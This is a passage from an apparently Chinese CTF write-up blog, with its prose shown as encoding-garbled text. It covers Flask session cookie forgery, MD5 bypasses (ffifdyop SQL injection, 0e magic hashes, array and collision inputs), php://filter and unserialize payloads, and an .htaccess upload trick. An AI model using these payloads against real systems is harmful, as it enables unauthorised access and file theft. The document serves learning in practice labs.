alt="image-20220626124227608"></p><p>ç„¶åå…¶å®åŠ å¯†çš„æ—¶å€™ -tå‚æ•°æ²¡å¿…è¦å†™è¿™ä¹ˆé•¿ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°index.htmlé‡Œä»£ç æ˜¯ï¼Œåªè¦<code>session[&#39;name&#39;]==admin</code>å³å¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨</p><pre class="line-numbers language-none"><code class="language-none">python flask_session_cookie_manager3.py encode -s &#39;ckj123&#39; -t &quot;&#123;&#39;name&#39;:&#39;admin&#39;,&#39;user_id&#39;:&#39;10&#39;&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¹Ÿèƒ½å¾—åˆ°flagã€‚</p><h2 id="é—®é¢˜ï¼š"><a href="#é—®é¢˜ï¼š" class="headerlink" title="é—®é¢˜ï¼š"></a>é—®é¢˜ï¼š</h2><p>åœ¨ç»™pythonå®‰è£…flaskæ—¶å‡ºç°äº†ä¸€ä¸ªé—®é¢˜ï¼š</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">pip install flask<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ğŸ‘²ä»£ç†å°±æ— æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261334595.png" alt="image-20220626133402546"></p><p>è§£å†³æ–¹æ³•ï¼š</p><p>æ³•ä¸€ï¼š(æ‰¾ä¸€ä¸‹ä»£ç†ç½‘å€åé‡æ–°è£…)</p><pre class="line-numbers language-none"><code class="language-none">pip install flask --proxy&#x3D;&quot;ip:8080&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³•äºŒï¼šå…³ä»£ç†åå®‰è£…</p><h2 id="æ³•2ã€3"><a href="#æ³•2ã€3" class="headerlink" title="æ³•2ã€3"></a><strong>æ³•2ã€3</strong></h2><p>æ³•äºŒï¼šUnicodeæ¬ºéª—ï¼Œç»å°è¯•å¤±è´¥äº†ï¼Œä¼¼ä¹å¦ä¸€ç§ç¼–ç å½¢å¼çš„Aä¸èƒ½ç”¨å•¦</p><p>æ³•ä¸‰ï¼šæ¡ä»¶ç«äº‰ï¼ˆå¤ªèœå•¦ï¼Œå…ˆæŠŠåŸºç¡€å­¦äº†ï¼Œä¼šç¢ç£¨çš„ğŸ˜¢ï¼‰</p><p><a href="(https://www.anquanke.com/post/id/164086#h3-13)">å‚è€ƒä¸€ï¼šä¸‰ç§æ–¹æ³•</a></p><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">å‚è€ƒäºŒï¼šå®¢æˆ·ç«¯sessioné—®é¢˜è§£é‡Š</a></p><hr><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261832452.png" alt="image-20220626183214284"></p><h2 id="æ­¥éª¤ï¼š"><a href="#æ­¥éª¤ï¼š" class="headerlink" title="æ­¥éª¤ï¼š"></a>æ­¥éª¤ï¼š</h2><h3 id="æŠ“åŒ…ï¼Œè¿”å›hintï¼š"><a href="#æŠ“åŒ…ï¼Œè¿”å›hintï¼š" class="headerlink" title="æŠ“åŒ…ï¼Œè¿”å›hintï¼š"></a>æŠ“åŒ…ï¼Œè¿”å›hintï¼š</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261834867.png" alt="image-20220626183443823"></p><p>ç»“åˆï¼š<img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261835350.png" alt="image-20220626183536322"></p><h3 id="payload1ï¼šffifdyopç»•è¿‡"><a href="#payload1ï¼šffifdyopç»•è¿‡" class="headerlink" title="payload1ï¼šffifdyopç»•è¿‡"></a>payload1ï¼š<code>ffifdyop</code>ç»•è¿‡</h3><h4 id="ç»•è¿‡åŸç†æ˜¯ï¼š"><a href="#ç»•è¿‡åŸç†æ˜¯ï¼š" class="headerlink" title="ç»•è¿‡åŸç†æ˜¯ï¼š"></a>ç»•è¿‡åŸç†æ˜¯ï¼š</h4><p> <code>ffifdyop</code> è¿™ä¸ªå­—ç¬¦ä¸²è¢« md5 å“ˆå¸Œäº†ä¹‹åä¼šå˜æˆ <code>276f722736c95d99e921722cf9ed621c</code>ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å‰å‡ ä½åˆšå¥½æ˜¯<code>&#39; or &#39;6</code><br> è€Œ Mysql åˆšå¥½åˆä¼šæŠŠ hex è½¬æˆ ascii è§£é‡Šï¼Œå› æ­¤æ‹¼æ¥ä¹‹åçš„å½¢å¼æ˜¯<code>1select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</code>ï¼Œç­‰ä»·äº or ä¸€ä¸ªæ°¸çœŸå¼ï¼Œå› æ­¤ç›¸å½“äºä¸‡èƒ½å¯†ç </p><p>å‡ºç°ç¬¬äºŒä¸ªé¡µé¢ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// wow, glzjin wants a girl friend.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261832880.png" alt="image-20220626183242736"></p><h3 id="md5å¼±æ¯”è¾ƒï¼š"><a href="#md5å¼±æ¯”è¾ƒï¼š" class="headerlink" title="md5å¼±æ¯”è¾ƒï¼š"></a>md5å¼±æ¯”è¾ƒï¼š</h3><blockquote><blockquote><p>æ ¹æ®ä»£ç ä¸­çš„æ¡ä»¶ï¼Œè¦è®©aå’Œbå€¼ä¸ç­‰ä½†md5å€¼ç›¸ç­‰ã€‚ç”±äºè¿™é‡Œä½¿ç”¨çš„ä¸¤ä¸ªç­‰å·ï¼Œå¯ä»¥å€ŸåŠ©å¼±ç±»å‹æ¥ç»•è¿‡ä¸€ä¸‹ã€‚</p></blockquote></blockquote><blockquote><p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º<u><em><strong>0</strong></em></u>ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€<u><em><strong>0E</strong></em></u>â€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚</p></blockquote><h3 id="payload2ï¼š"><a href="#payload2ï¼š" class="headerlink" title="payload2ï¼š"></a>payload2ï¼š</h3><p><code>?a=s878926199a&amp;b=s155964671a</code></p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261846662.png" alt="image-20220626184636618"></p><p>ä»¥0eå¼€å¤´çš„MD5åŠåŸå€¼</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">s878926199a<span class="token number">0e545993274517709034328855841020</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s878926199a<span class="token number">0e545993274517709034328855841020</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1184209335a<span class="token number">0e072485820392773389523109082030</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s532378020a<span class="token number">0e220463095855511507588041205815</span>s878926199a<span class="token number">0e545993274517709034328855841020</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s878926199a<span class="token number">0e545993274517709034328855841020</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ°</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>md5å¼ºæ¯”è¾ƒï¼Œæ­¤æ—¶å¦‚æœä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯æ•°ç»„ï¼Œmd5()å‡½æ•°æ— æ³•è§£å‡ºå…¶æ•°å€¼ï¼Œè€Œä¸”ä¸ä¼šæŠ¥é”™ï¼Œå°±ä¼šå¾—åˆ°===å¼ºæ¯”è¾ƒçš„å€¼ç›¸ç­‰</p><h3 id="payload3"><a href="#payload3" class="headerlink" title="payload3:"></a>payload3:</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">param1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>param2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261851522.png" alt="image-20220626185144460"></p><p>å…¶å®ä¸æ­¢ä¼ æ•°ç»„ä¸€ç§è§£æ³•ï¼Œè¿˜å¯ä»¥æ„é€ ç›¸åŒmd5å€¼çš„ä¸¤æ¡æ•°æ®ã€‚md5å€¼ç›¸åŒçš„å­—ç¬¦ä¸²ç›®å‰ä¸ºæ²¡æœ‰æ‰¾åˆ°ï¼Œä½†äºŒè¿›åˆ¶æ•°æ®æ˜¯æœ‰çš„ï¼Œåœ¨ä¼ é€’æ—¶æ³¨æ„urlç¼–ç å³å¯ã€‚è¿™é‡Œç»™å‡ºå¦ä¸€ä¸ªè§£ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">param1<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span><span class="token number">1</span>b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span><span class="token number">4</span>a<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">3</span>e<span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span>f3<span class="token operator">%</span><span class="token number">6</span>e<span class="token operator">%</span><span class="token number">8</span>e<span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">6</span>d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span>d5<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2<span class="token operator">&amp;</span>param2<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261854257.png" alt="image-20220626185443186"></p><blockquote><p>æ³¨æ„ï¼šç”¨hacbarä¼ å€¼çš„è¯ä¼šå¤±è´¥ï¼Œç›´æ¥ç”¨bpä¼ å‚</p></blockquote><h2 id="è€ƒç‚¹ï¼š"><a href="#è€ƒç‚¹ï¼š" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h2><ol><li>md5çš„æ•°ç»„ç»•è¿‡</li><li>å“ˆå¸Œç¢°æ’ç»•è¿‡</li><li>å¼±ç±»å‹ç»•è¿‡</li><li>åˆ©ç”¨äºŒè¿›åˆ¶md5æ•°æ®æ„é€ SQLæ³¨å…¥</li></ol><hr><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><h2 id="é¢˜ç›®ç¯å¢ƒï¼š-1"><a href="#é¢˜ç›®ç¯å¢ƒï¼š-1" class="headerlink" title="é¢˜ç›®ç¯å¢ƒï¼š"></a>é¢˜ç›®ç¯å¢ƒï¼š</h2><pre class="line-numbers language-none"><code class="language-none"> &lt;?php  $text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];$password &#x3D; $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the zjctf&quot;))&#123;    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;        echo &quot;Not now!&quot;;        exit();     &#125;else&#123;        include($file);  &#x2F;&#x2F;useless.php        $password &#x3D; unserialize($password);        echo $password;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1:"></a>payload1:</h3><p>ä½¿ç”¨hacbarä¸­çš„å·¥å…·æ„é€ ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">?text=data://text/plain;base64,[d2VsY29tZSB0byB0aGUgempjdGY=]&amp;file=php://filter/convert.base64-encode/resource=useless.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="base64è§£ç "><a href="#base64è§£ç " class="headerlink" title="base64è§£ç "></a>base64è§£ç </h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206262024300.png" alt="image-20220626202403253"></p><p>å¾—åˆ°ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>      <span class="token keyword">class</span> <span class="token class-name-definition class-name">Flag</span><span class="token punctuation">&#123;</span>  <span class="token comment">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>              <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token delimiter important">?></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload2ï¼š-1"><a href="#payload2ï¼š-1" class="headerlink" title="payload2ï¼š"></a>payload2ï¼š</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token keyword">class</span> <span class="token class-name-definition class-name">Flag</span><span class="token punctuation">&#123;</span>  <span class="token comment">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token comment">#$file = "flag.php"; </span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>              <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Flag"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="finally-payloadï¼š"><a href="#finally-payloadï¼š" class="headerlink" title="finally  payloadï¼š"></a>finally  payloadï¼š</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">?text<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token operator">//</span>text<span class="token operator">/</span>plain<span class="token punctuation">;</span>base64<span class="token punctuation">,</span><span class="token punctuation">[</span>d2VsY29tZSB0byB0aGUgempjdGY<span class="token operator">=</span><span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token builtin">file</span><span class="token operator">=</span>useless<span class="token punctuation">.</span>php<span class="token operator">&amp;</span>password<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Flag"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h1><h2 id="é¢˜ç›®ç¯å¢ƒï¼š-2"><a href="#é¢˜ç›®ç¯å¢ƒï¼š-2" class="headerlink" title="é¢˜ç›®ç¯å¢ƒï¼š"></a>é¢˜ç›®ç¯å¢ƒï¼š</h2><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206262049834.png" alt="image-20220626204934677"></p><h2 id="è§£é¢˜æ­¥éª¤ï¼š-1"><a href="#è§£é¢˜æ­¥éª¤ï¼š-1" class="headerlink" title="è§£é¢˜æ­¥éª¤ï¼š"></a>è§£é¢˜æ­¥éª¤ï¼š</h2><blockquote><p>åªè¦ä¸Šä¼ æ–‡ä»¶åä¸º .php* .phtml* éƒ½ä¼šè¢«æ‹¦æˆª</p><blockquote><blockquote><p>æ€è·¯ï¼š</p></blockquote></blockquote></blockquote><blockquote><blockquote><p>åˆ©ç”¨.htaccessæ–‡ä»¶ï¼Œå°†ä¸Šä¼ çš„pngå›¾ç‰‡è§£æä¸ºphpæ–‡ä»¶å³å¯</p></blockquote></blockquote><p>ä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œ å…¶å®ç°åŠŸèƒ½ä¸ºï¼šå½“å‰ç›®å½•ä¸‹æ‰€æœ‰ åç§°ä¸º<code>shell</code>çš„æ–‡ä»¶éƒ½ä»¥ php è¿›è¡Œè§£æ</p><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a><em>.htaccess</em></h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>FilesMatch <span class="token string double-quoted-string">"shell"</span><span class="token operator">></span>SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php<span class="token operator">&lt;</span><span class="token operator">/</span>FilesMatch<span class="token operator">></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>.htaccessæ–‡ä»¶è¿˜å¯ä»¥å†™æˆè¿™æ ·ï¼š(è¡¨ç¤ºæ‰€æœ‰jpgæ–‡ä»¶ä»¥phpè¿›è¡Œè§£æ)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token operator">.</span>jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206262137492.png" alt="image-20220626213740464"></p><h3 id="çŸ¥è¯†ï¼š"><a href="#çŸ¥è¯†ï¼š" class="headerlink" title="çŸ¥è¯†ï¼š"></a>çŸ¥è¯†ï¼š</h3><h4 id="htaccessæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#htaccessæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title=".htaccessæ˜¯ä»€ä¹ˆï¼Ÿ"></a>.htaccessæ˜¯ä»€ä¹ˆï¼Ÿ</h4><blockquote><p>.<a href="http://www.lvjiyong.com/tag/htaccess/">htaccess</a>æ–‡ä»¶(æˆ–è€…â€<a href="https://so.csdn.net/so/search?q=%E5%88%86%E5%B8%83%E5%BC%8F&spm=1001.2101.3001.7020">åˆ†å¸ƒå¼</a>é…ç½®æ–‡ä»¶â€ï¼‰æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ 